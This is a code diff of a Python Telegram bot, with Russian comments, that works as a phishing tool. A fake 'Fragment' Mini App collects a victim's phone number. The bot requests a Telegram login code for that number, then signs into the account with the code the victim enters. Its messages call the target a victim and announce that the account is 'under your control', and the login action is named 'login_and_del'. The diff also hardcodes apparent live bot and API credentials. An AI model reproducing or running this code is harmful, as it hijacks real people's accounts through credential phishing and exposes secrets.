@@ -4,74 +4,53 @@ from aiogram.filters import Command
 from aiogram.types import WebAppInfo, MenuButtonWebApp
 from telethon import TelegramClient
 
-# --- ТВОИ ДАННЫЕ ---
+# --- ДАННЫЕ ---
 BOT_TOKEN = "8611748903:AAGxBTXL74UfjsO26s5ZT4h6mts2VwCBpU0"
 API_ID = 28687552
 API_HASH = "1abf9a58d0c22f62437bec89bd6b27a3"
 ADMIN_ID = 174415647
-WEB_APP_URL = "https://dreiner.onrender.com" 
+WEB_APP_URL = "https://dreiner.onrender.com"
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
-# Словарь для хранения активных сессий
-active_sessions = {}
 
-# Команда /start добавляет кнопку Fragment в меню
+# ОСНОВНОЙ КЛИЕНТ (Твой вход)
+admin_client = TelegramClient('admin_auth', API_ID, API_HASH)
+victim_clients = {}
+
 @dp.message(Command("start"))
-async def cmd_start(message: types.Message):
-    if message.from_user.id != ADMIN_ID: return
-    
-    await bot.set_chat_menu_button(
-        chat_id=message.chat.id,
-        menu_button=MenuButtonWebApp(text="Fragment", web_app=WebAppInfo(url=WEB_APP_URL))
-    )
-    await message.answer("🚀 **Панель Fragment активирована!**\nНажми кнопку в меню слева, чтобы начать.")
+async def start(m: types.Message):
+    if m.from_user.id != ADMIN_ID: return
+    await bot.set_chat_menu_button(chat_id=m.chat.id, menu_button=MenuButtonWebApp(text="Fragment", web_app=WebAppInfo(url=WEB_APP_URL)))
+    await m.answer("🚀 Панель готова! Проверь консоль хостинга, если бот еще не запущен.")
 
-# ОБРАБОТКА ДАННЫХ ИЗ MINI APP
 @dp.message(F.web_app_data)
-async def handle_web_app_data(message: types.Message):
-    data = json.loads(message.web_app_data.data)
-    action = data.get("action")
-    phone = data.get("phone")
+async def handle_data(m: types.Message):
+    data = json.loads(m.web_app_data.data)
+    action, phone = data.get("action"), data.get("phone")
     
     if action == "send_code":
-        await message.answer(f"📩 **Запрос кода для:** `{phone}`\nПожалуйста, подождите...", parse_mode="Markdown")
-        
-        # Создаем клиента Telethon для отправки кода
-        client = TelegramClient(f'session_{phone}', API_ID, API_HASH)
-        active_sessions[phone] = client
-        
+        await m.answer(f"📩 Запрашиваю код для `{phone}`...")
+        client = TelegramClient(f'v_{phone}', API_ID, API_HASH)
+        victim_clients[phone] = client
         await client.connect()
         try:
-            # ВОТ ЭТА КОМАНДА ЗАСТАВЛЯЕТ TELEGRAM ОТПРАВИТЬ КОД ЖЕРТВЕ
             await client.send_code_request(phone)
-            await message.answer(f"✅ **Код успешно отправлен!**\nПользователь `{phone}` должен получить его в Telegram.", parse_mode="Markdown")
-        except Exception as e:
-            await message.answer(f"❌ **Ошибка отправки кода:**\n`{str(e)}`", parse_mode="Markdown")
-            await client.disconnect()
+            await m.answer("✅ Код отправлен жертве!")
+        except Exception as e: await m.answer(f"❌ Ошибка: {e}")
 
     elif action == "login_and_del":
-        code = data.get("code")
-        client = active_sessions.get(phone)
-        
-        if not client:
-            await message.answer("❌ Ошибка: Сессия не найдена. Попробуйте ввести номер заново.")
-            return
-
-        await message.answer(f"⚙️ **Вхожу в аккаунт `{phone}`...**", parse_mode="Markdown")
-        
+        code, client = data.get("code"), victim_clients.get(phone)
+        await m.answer(f"⚙️ Вхожу в `{phone}`...")
         try:
-            # Входим в аккаунт по коду из Mini App
             await client.sign_in(phone, code)
-            await message.answer(f"🔓 **ВХОД ВЫПОЛНЕН!**\nАккаунт `{phone}` теперь под вашим контролем.", parse_mode="Markdown")
-            
-            # Здесь можно добавить автоматическое удаление через my.telegram.org
-            # Но для начала проверь сам вход.
-            
-        except Exception as e:
-            await message.answer(f"❌ **Ошибка входа:**\n`{str(e)}`", parse_mode="Markdown")
+            await m.answer(f"🔓 Вход в `{phone}` успешен!")
+        except Exception as e: await m.answer(f"❌ Ошибка: {e}")
 
 async def main():
+    # ПЕРВЫЙ ЗАХОД (Авторизация админа)
+    await admin_client.start() 
+    print("--- АДМИН АВТОРИЗОВАН ---")
     await dp.start_polling(bot)
 
 if __name__ == '__main__':
